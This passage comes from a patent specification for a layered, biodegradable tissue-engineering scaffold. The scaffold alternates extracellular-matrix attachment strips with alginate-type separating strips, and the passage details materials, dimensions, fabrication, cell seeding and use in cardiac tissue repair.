more biodegradable than polyester fibers or PTFE have been used to fabricate tissue-engineering scaffolds such as polyglycolic acid (PGA), polylactic acid (PLA). PGA, PLA and their copolymers are the most commonly used synthetic polymers in tissue engineering. However, in order for these structures to promote functional tissue growth/reconstruction, a complex micro-architecture must be produced, and this requires difficult processing methods.\nNon-synthetic materials, such as animal materials, have also been used to produce tissue-regeneration/repair scaffolds. Efforts to use animal materials have been unsatisfactory when these materials are cross-linked by formaldehyde or glutaraldehyde, for example. This form of generalized aldehydic crosslinking tends to render biomaterials sufficiently unrecognizable to tissue cells such that normal remodeling and integration are not promoted. Similarly, other types of chemical processing of animal or human biomaterials, such as extraction with detergents, hypertonic buffers or hypotonic buffers can alter them to the degree that leave these biomaterials toxic to tissue cells, ineffective in promoting angiogenesis, and ineffective in stimulating repair and remodeling processes needed for the conversion of an implant into a functional substitute for the tissue or organ being replaced.\nAnother approach uses extracellular matrix (ECM) components in processed or natural forms to regenerate tissue in vitro and in vivo. The interaction of cells with ECM in in vivo and in vitro environments is important in the organization, function and growth of all tissues and organs. Biochemical and biophysical signals between the cell and the ECM regulate fundamental cellular activities including adhesion, migration, proliferation, differential gene expression, and programmed cell death. Processed forms of ECM have been used as tissue regeneration aids. For example, as described in U.S. Pat. No. 5,275,826, fluidized intestinal submucosa can be injected into host tissues in need of repair or used in combination with other graft materials. Basement-membrane-derived ECM compositions (e.g. MATRIGEL\u2122, BECTON-DICKINSON) in the form of polymerizable extracts have also been used to regenerate or repair tissue. These polymerizable extracts can be formed or molded into a three-dimensional gel structure attempting to resemble lamellar structures (U.S. Pat. No. 4,829,000). Collagen-based gels have also been combined with specialized cells. This process depends upon interactions between the cells and collagen filaments in the gel so that the cells condense and organize. While tissue-like constructs have been fabricated and been shown to have some resemblance to their natural counterparts, these constructs do not readily develop the matrix complexity characteristic of the actual tissues that they are meant to imitate (U.S. Pat. Nos. 4,485,096 and 4,485,097).\nNatural forms of ECM (e.g., isolated sheets or layers) can be obtained from tissue submucosa of warm-blooded vertebrates. For example, the tunica submucosa of the intestine is often used as tissue graft material; see U.S. Pat. Nos. 4,902,508 and 5,281,422. Both stomach (U.S. Pat. No. 6,099,567) and urinary bladder (U.S. Pat. Nos. 5,554,389 and 6,171,344) submucosa have also been described as natural sources of ECM. Large sheets of submucosal tissue can be prepared from smaller segments of submucosal tissue through conventional techniques such as weaving, knitting or the use of adhesives (U.S. Pat. No. 5,997,575). Purified submucosa can also be shaped into other forms with other graft materials, for example, a tubular graft composed of sheets of submucosa wrapped around a tube (U.S. Pat. No. 6,358,284). However, a limitation of these natural forms is that it is difficult to fashion three-dimensional tissue structures that mimic the endogenous tissue architecture where the graft or scaffold is to be used, for example, to form the complex shape of a valve.\nCardiac tissue repair presents challenges to tissue-engineering methods. Cardiac tissues are difficult to repair as the tissue has a limited ability to regenerate and because the tissue has a complex architecture that is difficult to mimic. For example, cardiomyocytes have a natural complex architecture with particular electromechanical properties. Endogenous cardiomyocytes are organized into parallel cardiac muscle fibers with intracellular contractile myofibrils oriented parallel to the long axis of each cell. Junctional complexes between abutting cells are concentrated at the ends of each cardiomyocyte. Such architecture provides the electromechanical coupling of cardiomyocytes needed to stimulate the transmission of directed contraction over long distances. However, cultured cardiomyocytes typically spread on a flat substrate to form an unorganized monolayer with disorganized myofibrils and junctions. In vitro methods have been created that align cardiomyoctes into functional organizations by growing cultured cardiomyocytes on flat micro-patterned substrates (McDevitt, T. C. et al., \"In vitro generation of differentiated cardiac myofibers on micropatterned laminin surfaces,\" J. Biomed. Mater. Res., (2002), 60:472-479). However, such methods provide two-dimensional tissue layers that are difficult to transform into a three-dimensional tissue repair scaffold.\nThus, biocompatible, biodegradable, three-dimensional scaffolds that are adaptable to different in vivo tissue architectures and that promote the natural, functional coupling between cells present in the scaffold and cells in the surrounding tissue are desired. Further, methods of producing such improved scaffolds that are efficient and simple are also desired.\nThe present invention is directed to a semi-solid, three-dimensional, biocompatible scaffold for cell growth, tissue repair or regeneration, comprising one or more layers of alternating attachment-strips (\"A-strips\") and separating-strips (\"S-strips\") wherein the A-strips within each layer are aligned parallel to each other and preferentially promote cellular attachment over attachment to the S-strips. The present invention is also directed to methods of producing and implanting such scaffolds.\nIn one aspect, the scaffold is biodegradable and re-shapeable. After implantation of the scaffold into an area of tissue damage or disease, cells migrate into the scaffold and preferentially attach to the A-strips allowing cells to align in accordance with the architecture of the scaffold. The architecture of the scaffold can thus provide spatial- and orientation-dependent signals for cell growth and/or differentiation. As the cells grow and differentiate, they reshape the architecture of the scaffold such that the scaffold is adopted into the surrounding tissue. Eventually these scaffolds completely degrade leaving behind the integrated cellular tissue and tissue-specific extracellular matrix.\nThe design of the scaffolds can be varied in relation to different tissue architectures by varying the dimensions of the elements of the scaffolds, and/or the materials that the elements of the scaffold are made of. The elements of the scaffold are the A-strips, S-strips and the separating layers, and their dimensions as to width, length, thickness and porosity are fixed according to a scaffold's intended use in the repair, regeneration or growth of a particular tissue or cell type, in vivo or in vitro. The width of the A-strips and S-strips are fixed to promote the ordered alignment of cells within a layer so that cells can receive spatial- and orientation-dependent signals for cell growth and/or differentiation from each other and from the strip materials. The materials of the scaffold are also chosen such that the A-strips promote the adhesion of cells more than the S-strips and the separating layers, and such that the porosity of the S-strips and separating layers allow a homogeneous distribution of cells throughout the scaffold. Further, the scaffold can be supplemented or treated with bioactive agents such as those, for example, that promote cell migration and proliferation.\nIn accordance with the invention, the scaffold can be implanted in a subject at a site of tissue damage without having been pre-seeded with cells. In this embodiment, the scaffold is seeded with cells in situ either by endogenous cells or by cells separately implanted into the subject. Alternatively, the scaffold can be pre-seeded with cells in vitro prior to implantation in a subject.\nIn another aspect of the present invention, methods of producing the scaffolds of the inventions are provided. In one embodiment, a method of producing a semi-solid, three-dimensional, biocompatible scaffold comprises layering one or more sheets of biocompatible strip material by a fixed distance from each other; cutting the sheets to provide A-strips of a fixed width, maintaining the parallel A-strips at a fixed distance from each other; and contacting the parallel A-strips with a biocompatible material that does not promote cellular attachment under conditions to fill the space separating the A-strips, thereby forming S-strips, and to fill the space separating the layers; to form a semi-solid, three-dimensional, biocompatible and, preferably, biodegradable scaffold.\nFIG. 1A and FIG. 1B depict an apparatus that can be used to produce scaffolds in accordance with the present invention. FIG. 1A is a side-view and FIG. 1B presents a top-view. In this figure, several sheets of submucosal tissue (denoted by the black lines) are clamped with the sheets separated by a fixed horizontal distance. A 'comb of knives' is inserted vertically through all the sheets and moved along their length to create A-strips. A spacer comb (\"spacers\" in the figures) is inserted at the end where the cutting begins and another spacer comb follows the comb of knives, and remains at the other end after the cutting is completed. These spacer combs thus hold the A-strips apart by a fixed distance. The clamped and spaced A-strips are then placed into a mold filled with an alginate solution. A cross-linking agent is added to the alginate solution. The clamps and spacer combs are removed once the scaffold attains a semi-solid state and results in formation of a semi-solid scaffold containing the aligned A-strips of submucosa separated by alginate S-strips.\nFIG. 1B additionally depicts the dimensions of the apparatus. The width of the sheet is represented by \"a\", and the width of a scaffold layer is represented by \"b\". The width of a scaffold layer, \"b\", can be determined by the formula \"b=a+(n)(s)\" where \"n\" represents the number of knives in a comb of knives and where \"s\" represents the width of the spacer in the comb of spacers. The knife spacing can be determined from the formulas: \"a/n+1\" or \"(b\u2212(n)(s))/(n+1)\".\nFIG. 2 depicts a scaffold where the strips between layers are not aligned. Lined areas represent A-strips and clear areas represent S-strips. In this figure, scaffold layer B is made separately, and then combined with scaffold layer A and a separating layer to form a multi-layered scaffold. The A-strips of layer A can be placed in any orientation relative to the A-strips of layer B in the scaffold.\nThe issued U.S. patents, published and allowed applications, and references cited herein are hereby incorporated by reference.\nThe present invention relates to a biocompatible, three-dimensional scaffold useful for growing cells, regenerating or repairing tissue.

The semi-solid, three-dimensional, biocompatible scaffold for cell growth, tissue repair or regeneration, or any combination thereof, comprises one or more layers of alternating attachment-strips (\"A-strips\") and separating-strips (\"S-strips\"), wherein the A-strips within each layer are aligned parallel to each other, and wherein the A-strips preferentially promote cellular attachment. \"Attachment-strips\" or \"A-strips\" are defined herein as an element of the scaffold that preferentially promotes cellular attachment over other elements of the scaffold. \"Separating-strips\" or \"S-strips\" are defined herein as an element of the scaffold that does not preferentially promote cellular attachment, and in relation to the architecture of the scaffold, serves to separate the A-strips from each other within a scaffold layer.\nThe dimensions and the materials of the scaffold are designed to allow cells to align in a manner to receive spatial- and/or orientation-dependent cues or signals from other cells and/or from the materials that constitute the A-strips of the scaffold. These signals or cues help the cells in the scaffold to grow and differentiate so that the cells can adopt to and/or integrate into the surrounding tissue in which the scaffold is implanted. Additionally, the scaffold can also provide the cues or signals such that cells in the scaffold grow and differentiate into functional tissues in vitro.\nThe scaffold of the present invention has from one to many layers. Preferably the scaffold comprises multiple alternating layers of scaffold layers and separating layers. The scaffold layer is composed of alternating A-strips and S-strips where the A-strips within the scaffold layer are aligned parallel to each other. In accordance with the invention, A-strips preferentially promote the attachment of cells, and S-strips and separating layers do not preferentially promote the attachment of cells. As used herein, \"preferentially promotes\" means that more cells attach to the A-strips rather than to the S-strips or the separating layers. In addition, preferentially promoting attachment can be achieved by preferential proliferation or differentiation of the cells on the A-strips rather than on the S-strips or the separating layers.\nIt is preferred that greater than about 70% of the cells within a scaffold are present on A-strips. It is more preferred that greater than about 90% of the cells within a scaffold are present on A-strips. The percentage of cells present on A-strips as compared to S-strips can be tested by performing a 2-dimensional cell culture experiment where the culture surface is coated with S-strip and A-strip material in an area and design similar to one layer of a desired scaffold. A cell type will be used which is relevant to the intended target tissue of the scaffold.\nThe A-strips can range from about 20 micrometers to about 200 micrometers in thickness, and from about 20 micrometers to about 100 micrometers in width. These dimensions, especially the width, are relevant to the cell-attachment properties of the A-strip. For example, if the A-strips are too narrow (i.e., if the A-strips are more narrow than the size of a cell), then cells cannot properly attach. If the A-strips are too wide, then cells may not properly or efficiently align in relation to the architecture of the layer because the cells cannot align on the A-strips in a linear fashion. For use with cardiomyocytes, the preferred width of the A-strips is from about 20 to about 50 micrometers in width.\nThe S-strips can range from about 20 micrometers to about 200 micrometers in thickness, and from about 20 micrometers to about 200 micrometers in width. If the S-strips are too narrow, i.e., similar to the width of a single cell, then the A-strips cannot function to align the cells in a parallel orientation. For example, if the cells on one A-strip are able to span the distance of the S-strip to another A-strip, then the A-strips are less effective in aligning cells in a substantially linear fashion on an A-strip. For cardiomyocytes, the preferred width of an S-strip is from about 50 to about 100 micrometers in width.\nThe separating layer alternates with the scaffold layer. As defined herein, a \"scaffold layer\" is a layer of a scaffold comprising alternating A-strips and S-strips. In other words, the separating layer serves to separate the scaffold layers from each other. According to the present invention, a separating layer can be made of a material suitable for a S-strip. Hence, a separating layer is made of a material that does not preferentially promote cell attachment and/or proliferation and/or differentiation. Thus, the A-strips of the scaffold preferentially promote cell attachment over the S-strips and the separating layers.\nThe separating layer can range from about 20 micrometers to about 200 micrometers in thickness. Further, the separating layer and the S-strips can, but need not necessarily contain pores. The pores allow cell migration and can range from about 10 micrometers to about 300 micrometers in diameter. The pore size cannot exceed the dimensions of a layer. The pores allow cells to migrate throughout the scaffold, to aid in providing an even or homogeneous distribution of cells throughout the scaffold. The pores also enable the migration of soluble peptides and proteins that are necessary for cellular growth and communication. The pores also enable efficient vascularization between the scaffold and the surrounding tissue.\nThe alignment of the A-strips within a scaffold layer is parallel. However, when the scaffold is multi-layered, the alignment of the A-strips between successive scaffold layers need not be parallel (See FIG. 2). For example, the scaffold can be constructed such that there is no overall alignment of the A-strips from scaffold layer to scaffold layer. This overall random alignment serves to grow and regenerate tissue where cell alignment is not ordered, for example, in skin. Of course, the scaffold can be constructed such that all the A-strips are aligned in one general parallel orientation, or in any other desired pattern, e.g., such as alternating 90\u00b0 angles.\nThe scaffold is preferably composed of a material that permits cells to reshape the scaffold. Such properties allow the cells of the scaffold to become integrated with or adopted into the surrounding tissue in which the scaffold is implanted. By \"integrating\" or \"adopting\", the cells of the scaffold are not rejected by the surrounding tissue in which the scaffold is implanted. The scaffold is more re-shapeable when the materials of the scaffold are biodegradable and not synthetic.\nThe A-strips of the present invention are constructed from a biocompatible substance that can be formed into a shape that essentially resembles a strip or a fiber having the dimensions stated herein. Biocompatible substances that can be used to form the A-strips, include but are not limited to, extracellular matrix material, proteins or peptides that are not present in extracellular matrices but have cell attachment properties, and synthetic materials, provided such materials can be formed into A-strips of the appropriate size and have the requisite biological characteristics to preferentially promote cell attachment and/or proliferation and/or differentiation. Non-synthetic, biocompatible and biodegradable materials are preferred for A-strips, such as extracellular matrix material. If synthetic materials are used as strip material, the synthetic materials can be combined with either extracellular matrix material or proteins or peptides with cell-attachment properties so that the strips preferentially promote cell attachment or proliferation.\nAccording to the present invention, \"extracellular matrix material\" is any material or substance that is present in an extracellular matrix. An extracellular matrix is an acellular sheet or layer that consists of three major classes of biomolecules: (1) structural proteins such as collagen and elastin, (2) specialized proteins such as, perlacan, agrin, laminin, fibronectin, entactin, nidogen, and fibrillin, and (3) proteoglycans which are composed of a protein core to which is attached long chains of repeating disaccharide units (glycosaminoglycans (GAGs)). Thus, according to the present invention, any of the above-types of biomolecules, individually or in combination, in natural, processed or recombinant forms, are considered extracellular matrix material.\nThe extracellular matrix material can be isolated from animals or from an in vitro cellular source rich in producing extracellular matrix material. Sheets of extracellular matrix isolated from animals can be cut to form the A-strips of the scaffold. Alternatively, sheets of isolated extracellular matrix material can be processed into gels or liquids (see for example, U.S. Pat. Nos. 5,275,826 or 4,829,000), and these gels or liquids can be molded to form the A-strips of the scaffold. Additionally, recombinant forms of extracellular matrix materials can be used to form the strips of the scaffold.\nThe extracellular matrix material can be isolated from a variety of tissue sources, for example, essentially any submucosa. A submucosa is a layer of areolar connective tissue that lies beneath the mucosa. Examples of submucosa that can be used as a source of extracellular matrix material, include intestine submucosa, stomach submucosa, liver submucosa, and urinary bladder submucosa. Basement membranes can also be used as a source of extracellular matrix material. Basement membranes are thin, but continuous sheets that separate epithelium from stroma and surround nerves, muscle fibers, smooth muscle cells and fat cells. Additionally, tissues such as bone, bone marrow, cartilage and placenta can also be sources of extracellular matrix material. Further, embryonic and fetal cardiac tissue can be sources of extracellular matrix material. Representative processes that can be used to isolate extracellular matrix material from tissue are described in, Voytik-Harbin, S. L., \"Three-dimensional extracellular matrix substrates for cell culture,\" Methods Cell Biol., (2001), 63:561-81.\nThe tissue sources of extracellular matrix material can be isolated from any mammal, including but not limited to: pig, human, cow, sheep, goat, donkey, horse, rabbit, dog, cat, rat and mouse. The extracellular matrix material can be in the form of a sheet from which A-strips are cut, or the material can be processed into their separate components or combinations of components, and then formed into A-strips or a sheet. Such sheets can then be cut into A-strips in accordance with the invention. Alternatively, if individual A-strips are formed, these A-strips have the dimensions as stated herein and are arrangeable in a parallel orientation.\nSheets of extracellular matrix can be isolated from essentially any type of submucosa. For example, in U.S. Pat. No. 4,902,508, by delaminating the tunica muscularis and at least the luminal portion of the tunica mucosa of the small intestine, a tunica submucosa was isolated. As described in U.S. Pat. No. 6,099,567, the stomach submucosa can be isolated by delaminating the smooth muscle layers of the muscularis externa and at least the luminal portion of the mucosal layer of a segment of the stomach. As described in U.S. Pat. No. 5,554,389, urinary bladder submucosa is isolated by delaminating the abluminal muscle cell layers and at least the luminal portion of the mucosal layer of a segment of urinary bladder. Acellular and detoxified sheets of submucosa are commercially available, for example, see COOK\u00ae Biotech Incorporated, SIS\u2122 Technology (COOK Biotech Incorporated, 3055 Kent Avenue, West Lafayette, Ind. 47906 USA).\nExtracellular matrix material can also be isolated as a slurry or solution. Solutions or slurries can be processed or molded into A-strips of the appropriate dimensions, for example, by the following processes: freeze-drying in a mold; air drying into A-strips; air drying into sheets which are cut into A-strips; gelled by neutralizing pH; and solutions or slurries can be combined with a second material (e.g., collagen, gelatin, self-assembling peptides) which can be solidified, cross-linked, or otherwise turned into a solid without affecting the biological activity of the extracellular matrix material.\nProcessed or recombinant forms of extracellular matrix materials can be used as A-strip material. For example, U.S. Pat. No. 4,829,000 reports a processed, reconstituted, basement-membrane-derived extracellular matrix composition (MATRIGEL\u2122). Also, U.S. Pat. No. 5,275,826 reports fluidized forms of submucosa. Purified or recombinant forms of collagen, elastin, perlacan, agrin, laminin, fibronectin, entactin, nidogen, fibrillin, proteoglycans can be used as strip material, and are commercially available. For example, BD BIOSCIENCE\u2122 offers a variety of ECM products that can be used in the present invention: BD Matrigel\u2122 Basement Membrane Matrix, Collagen I ECM, Collagen III ECM, Collagen IV ECM, Collagen V ECM, Fibronectin ECM, Laminin ECM.\nThe extracellular matrix material can be from a syngeneic, allogeneic or xenogeneic source. When used as the material comprising the A-strips of the scaffold, the extracellular matrix material is acellular, and should not be recognized as \"foreign\" by a host's immune system, and therefore should not be rejected by the host. Further, the biocompatible materials that comprise the scaffold are substantially endotoxin free.\nProteins and peptides that have cell-attachment properties but are not present in extracellular matrices can also be used as A-strip material. Such proteins and peptides include, but are not limited to, vitronectin, polypeptides with the amino acid sequence arginine-glycine-aspartic acid ('RGD sequence'), and poly-L-lysine. According to the present invention, proteins and peptides that have cell attachment properties are proteins or peptides that bind to molecules on a cell surface with an affinity such that the binding is not transient.\nSynthetic materials such as polylactic acid (PLA), poly-glycolic acid (PGA), co-poly-lactic/poly-glycolic acid polymers (PLGA), can also be used as A-strip material, if a non-biodegradable scaffold is desired. If synthetic materials are used as A-strip material, the synthetic materials can be combined with either extracellular matrix material or proteins or peptides with cell-attachment properties so that the A-strips preferentially promote cell attachment. Preferably, the A-strips of the present invention are made from extracellular matrix material or proteins or peptides with cell attachment properties.\nThe S-strips and the separating layers of the invention are biocompatible and preferably biodegradable substances that do not preferentially promote cell attachment. Preferably, the S-strips and the separating layers do not permit cells to substantially attach. The material of the S-strips and the material of the separating layer do not have to be identical. Examples of S-strips and separating layer material include, but are not limited to, alginate, agarose, polylactic acid (PLA), poly-glycolic acid (PGA), co-poly-lactic/poly-glycolic acid polymers (PLGA), gelatin, ethylene-vinyl acetate, fibrin, sucrose octasulfate, dextran, polyethylene glycol, polyacrylamide, cellulose, latex, polyhydroxyethylmethacrylate, nylon, Dacron, polytetrafluoro-ethylene, polystyrene, polyvinylchloride co-polymer, cat gut, cotton, linen, polyester, and silk. Alginate, agarose and gelatin, are preferred. It is also preferred that all of the elements of the scaffold have a similar rate of biodegradation.\nWhen the S-strips and separating layers comprise alginate, the porosity of alginate can be manipulated by using different sources of alginate, by varying the concentration of alginate, and by varying the divalent cations used to help polymerize the alginate.\nProteins or peptides can be micro-patterned on the surface of biocompatible sheets, A-strips, S-strips or separating layers. In the present invention, proteins or peptides are 'micro-patterned' by immobilizing proteins or peptides in micrometer sized shapes on the surface of biocompatible materials.\nAdvances in patterning technology have generated a range of techniques with which biomolecules can be immobilized on surfaces with microscale precision. Some techniques that can be used with the present invention include microcontact printing, photolithography, photochemistry, 3D printing, and microwriting. These techniques are known to those of skill in the art.\nThe scaffold of the present invention can also be treated with bioactive agents. These agents can be used alone or in combination and include, but are not limited to, vascularization-promoting factor, a cytokine, a growth factor, an enzyme, a hormone, an angiogenesis factor, a vaccine antigen, an antibody, a clotting factor, a regulatory protein, a transcription factor, a receptor, a structural protein, and any functional fragment, variant or combinations thereof. Preferably, the agents are located on or in the A-strips of the scaffold, although they can be present in the S-strips and the separating layers, provided they do not alter the overall characteristic of the scaffold to promote cellular attachment to the A-strips. Agents that recruit cells or direct cells include cytokines, growth factors, enzymes, hormones, angiogenesis factors, regulatory proteins, transcription factors, receptors, structural proteins and any of their bioactive functional fragments. Agents that promote cell attachment include receptors and structural proteins. Agents that promote vascularization of the scaffold and tissue include vascularization promoting factors, cytokines, growth factors and angiogenesis factors.\nExamples of specific bioactive agents include, but are not limited to, collagen, laminin, fibronectin, granulocyte-colony stimulating factors (G-CSF), granulocyte-macrophage colony stimulating factor (GM-CSF), stem cell factor (SCF), vascular endothelial growth factor (VEGF), platelet-derived growth factor (PDGF), transforming growth factors, human growth hormone (hGH), Factor VIII, Factor IX, erthropoietin (EPO), albumin, heme oxygenase, hemoglobin, alpha-1 antitrypsin, calcitonin, glucocerebrosidase, low density lipoprotein (LDL) receptor, IL-2 receptor, globins, immunoglobulins, catalytic antibodies, interleukins, chemokines, insulin, insulin-like growth factor 1 (IGF-1), insulinotropin, parathyroid hormone (PTH), leptin, an interferon, nerve growth factors, epidermal growth factor (EGF), endothelial cell growth factor, endothelial cell stimulating angiogenesis factor (ESAF), angiogenin, tissue plasminogen activator (t-PA), follicle stimulating hormone (FSH), Flt-3 ligand, megakaryocyte growth and development factor (MGDF), and 3-hydroxy-3-methyl glutaryl coenzyme A (HMG CoA) reductase inhibitors, and any functional fragment, variant or combinations thereof.\nThe architecture of the scaffold helps in promoting cellular growth and differentiation. Most cells can grow in vitro without any scaffolding. Yet, many cells do not fully differentiate without spatially defined cell-contact and orientation signals. For example, integrin receptors on the surface of cells bind to RGD (arginine-glycine-aspartic acid) sequences in extracellular matrix proteins such as fibronectin. This interaction induces cell spreading and intracellular signaling. Spatial orientation helps to provide proper cell-to-cell signaling and cellular function. For example, cardiomyocytes are organized into parallel cardiac muscle fibers with intracellular contractile myofibrils oriented parallel to the long axis of each cell and junctional complexes between abutting cells concentrated at the ends of each cardiomyocyte. Without this highly oriented architecture, electromechanical coupling of cardiomyoctes does not occur, and the transmission of directed contraction over long distances is not possible. Thus, although cardiomyocytes can be grown in in vitro cultures, the cultured cardiomyocytes only spread to form an epithelioid sheet, with disorganized myofibrils and diffuse intercellular junctions.\nThe scaffolds of the present invention are used for both in vitro and in vivo cellular growth and differentiation. The purpose of in vivo use is for the repair and regeneration of damaged and/or diseased tissue. The scaffolds can be used as self-seeding scaffolds for cellular attachment, growth and repair in situ; or the scaffold can be seeded in vitro with cells prior to implantation. Generally, cells at a concentration of 1\u00d7106 to 5\u00d7106 cells/ml are added to a dish or bioreactor containing a scaffold(s), and the cells are incubated for 24-72 hours at 37\u00b0 C. at 5% CO2 for initial seeding. However, the cell concentration can range from about 1\u00d7104 to about 1\u00d7107, or higher for cells that can achieve such concentrations.\nAs used herein, the term \"damaged or diseased tissue\" means tissue in which cells have been lost or have died due to insufficient blood supply, mechanical injury, infection, irradiation, trauma, disease, or other insult. For example, damaged and or diseased tissue includes, but is not limited to, scar tissue, and tissue that is torn, crushed, or has undergone necrosis resulting from blood loss. By \"necrosis\" is meant pathologic cell death following irreversible damage to the cell. The damaged or diseased tissue can be distinguished from the surrounding tissue, for example, by physical inconsistency or discontinuity.\nCells which can used to seed the scaffold in vitro include, but are not limited to, side population (SP) adult stem cells. Lineage negative (Lin\u2212) stem cells, Lin\u2212CD34\u2212 stem cells, Lin\u2212CD34+ stem cells, Lin\u2212cKit+stem cells, mesenchymal stem cells (MSC), cord blood cells, tissue stem cells, whole bone marrow, bone marrow mononuclear cells (BM-MNCs), cardiac stem cells, tissue stem cells, endothelial progenitor cells (EPCs), skeletal myoblasts (satellite cells), muscle derived cells (MDCs), go cells, endothelial cells, adult cardiomyocytes, fibroblasts, smooth muscle cells, genetically modified cells, MyoD scar fibroblasts, pacing cells, embryonic stem cell clones, embryonic stem cells, fetal or neonatal cells, teratoma cells, and any combination thereof.\nSP cells can be isolated by a fluorescence-activated cell sorter (FACS) technique utilizing the ability of SP cells to exclude Hoechst dye from the nucleus. In addition to bone marrow, SP cells have been isolated from most tissues, including cardiac and skeletal muscle. By the more common surface identification, these cells are Lin\u2212, Sca-1+, c-Kit+, CD43+, CD45+, CD34\u2212.\nBone marrow cells are isolated, and all the cells that have differentiated to a specific lineage are removed, either by FACS sorting or magnetic-bead sorting. The cells that remain are the stem and progenitor cells, or Lin\u2212 cells. Of these cells, the most primitive bone marrow-derived stem cells are Lin\u2212CD34\u2212. Cells that are Lin\u2212CD34+ include hematopoietic stem cells. Lin\u2212cKit+ cells express cKit, which is the cell surface receptor for stem cell factor. Therefore, Lin\u2212cKit+ cells are often used as a stem cell population. Lin\u2212cKit+ cells have been isolated from the heart and the bone marrow.\nWhole bone marrow can be used for transplantation and scaffold seeding. The whole bone marrow sample is filtered to remove bone particles. Whole bone marrow includes many extracellular matrix proteins and growth factors. The BM-MNC population can be separated from whole bone marrow by a density gradient centrifugation procedure. The BM-MNC population contains non-granular white blood cells, progenitor cells, and stem cells. Although most work to date has focused on isolating stem cells from the bone marrow, some stem cells (e.g., SP, Lin\u2212cKit+) can be isolated from tissues, for example fat and cardiac muscle.\nMSCs are stem cells that ordinarily differentiate into the cells of mesenchymal tissues (e.g. bone, cartilage, fat), but can also differentiate into cardiomyocytes under certain conditions. MSCs are isolated from the bone marrow, and have the capacity to proliferate in vitro. EPCs are also isolated from the bone marrow based on cell surface markers. EPCs differentiate into endothelial cells, and when transplanted to ischemic tissue, these cells can form new blood vessels.\nCord blood cells are isolated from the blood remaining in the umbilical vein following child birth. This blood has been shown to contain immature stem cells or progenitor cells.\nSkeletal myoblasts are cells responsible for the regeneration of skeletal muscle following injury. These cells have the ability to fuse with other myoblasts or damaged muscle fibers. In the present invention, skeletal myoblasts can be seeded into the scaffold so that these cells can integrate into a host's damaged myocardium or other damaged muscle tissue, and improve tissue properties or functionally participate in contraction. MDCs are a population of cells isolated from adult skeletal muscle that are similar to myoblasts, and can also be used to seed scaffolds that are to be implanted in areas of muscle damage. Go cells are also isolated from adult skeletal muscle, and these non-satellite cells express GATA-4 and, under in vitro growth conditions, develop into spontaneously beating cardiomyocyte-like cells.\nWhen the scaffold is not seeded with cells prior to implantation of the scaffold, the scaffold serves as an in situ self-seeding implant. After implantation of the scaffold into an area of tissue damage, cells migrate into the scaffold and preferentially attach to the A-strips. The cells are aligned to the architecture of the scaffold. As the cells grow and differentiate, they are able to refashion the architecture of the scaffold such that the scaffold is adopted into the surrounding tissue. When all the materials of the scaffold are biodegradable, the scaffold completely degrades leaving behind only the integrated cellular tissue and tissue-specific extracellular matrix.\nThe scaffold of the present invention can be designed to grow and/or repair any cell or tissue type in vitro or in vivo. If, for example, the scaffold is used to grow a skin substitute in vitro, the scaffold is designed so that the scaffold layers are randomly aligned relative to each other. If, for example, the scaffold is used to repair and regenerate damaged myocardial tissue, then the scaffold can be designed such that the scaffold layers are all substantially aligned relative to each other in a parallel orientation.\nFollowing implantation of the seeded or non-seeded scaffold into a subject, the subject can be treated with bioactive agents in order to promote the proliferation and differentiation of cells in the scaffold. Preferred bioactive agents for subject treatment include GM-CSF, G-CSF, IL-1, IL-3, SCF, VEGF, Flt-3 ligand, heme oxygenase, cell survival factors, and attachment factors such as collagen, laminin, fibronectin, and fragments and variants thereof which retain the same biological activity including fusion proteins and chimeric proteins. Chemical agents, such as nitric oxide and 5-azacytidine can also be used to promote engraftment of scaffolds. Alternatively, the scaffolds of the present invention can be pretreated to contain bioactive agents or chemical agents.\nA subject to be treated according to the method of the invention is one who has suffered an injury or has an illness or disorder that results in damaged or diseased tissue. In certain cases, the injury is an infarction that results in tissue necrosis, and more particularly, a myocardial infarction. Such subjects include humans and animals, such as laboratory animals or feed animals, including, but not limited to, mice, rats, rabbits, dogs, cats, cattle, swine, non-human primates, and others. Preferably, the subject is a human.\nThe scaffold can be used to treat any organ or tissue in need thereof. Examples of tissues include, but are not limited to, bone, cartilage, and striated muscle, which include cardiac muscle and skeletal muscle. Examples of organs that can be treated by the methods of the invention include, but are not limited to, heart, liver, brain, kidney, intestine, lung, eye, pancreas, bladder, and spinal cord.\nThe replacement of defective cardiac tissue by functioning myocardium is desired. Two strategies for the repair of cardiac tissue, the implantation of isolated cells and the implantation of in vitro designed tissue equivalents, are both improved when used with the scaffolds of the present invention.\nIn prior studies, the implantation or injection of cells into myocardial scar tissue improved global heart function (for example, see Carrier, R. L. et al., \"Cardiac Tissue Engineering: Cell Seeding, Cultivation Parameters, and Tissue Construct Characterization,\" Biotechnology and Bioengineering, 1999, 64(5): 580-589; Folliguet, T. A., \"Adult Cardiac Myocytes Survive and Remain Excitable During Long-Term Culture on Synthetic Supports,\" J. Thorac. Cardiovasc. Surg., 2001, 121:510-519; Li, R. K. et al., \"Cardiomyocytes transplantation improves heart function,\" Annals of Thoracic Surgery, 1996, 62:654-661; Li, R. K. et al., \"In vivo survival and function of transplanted rat cardiomyocytes,\" Circulation Research, 1996, 78:283-288; Li, R. K. et al., \"Survival and Function of Bioengineered Cardiac Grafts,\" Circulation, 1999, 100 (suppl. II): 63-69; and Li, R. K. et al., \"Construction of a bioengineered cardiac graft,\" J. Thorac. Cardiovasc. Surg., 2000, 119:368-375. Surprisingly, the effect appeared to be independent of cell origin, as positive results were reported from fetal or neonatal cardiac myocytes, fibroblasts, endothelial cells, smooth muscle cells, skeletal myoblasts, and stem cells. Further, expanding autologous skeletal myoblasts ex vivo and injecting them into the area of scar tissue has also led to some positive results. However, despite survival and differentiation of implanted cells, mechanical and electrical cell-cell contacts between graft and host, a requirement for functioning myocardial tissue, is only rarely observed. Thus, one embodiment of the present invention comprises implanting a scaffold (either with or without pre-seeding of cells or bioactive agents) to the area of myocardial scar tissue. Concurrently, subsequently or prior to implantation of the scaffold, cells are additionally implanted. The scaffolds of the present invention are designed such that mechanical and electrical cell-cell contacts between graft and host are improved.\nThe second approach for the repair/replacement of damaged or diseased cardiac tissue uses in vitro designed cardiac constructs. However, prior in vitro designed cardiac constructs have suffered the problems of: (1) the scaffold materials exhibit an intrinsic stiffness that compromises diastolic function, (2) biodegradation of the scaffold materials remains incomplete, adding to problems with diastolic function, (3) size limitation of engineered constructs due to a lack of metabolic or oxygen supply in the core of three-dimensional constructs, and (4) lack of homogeneous cell distribution within the scaffold. As to the last problem, cardiac myocytes seeded on or in gelatin meshes formed only a 300 micrometer thick cell layer on the outside due to problems of the myocytes in migrating through the gelatin meshes (Li et al., 2000). Similarly, cardiac myocytes seeded on synthetic polymer scaffolds only form cell layers of 50 to 70 micrometers.\nIn one embodiment, the scaffolds of the present 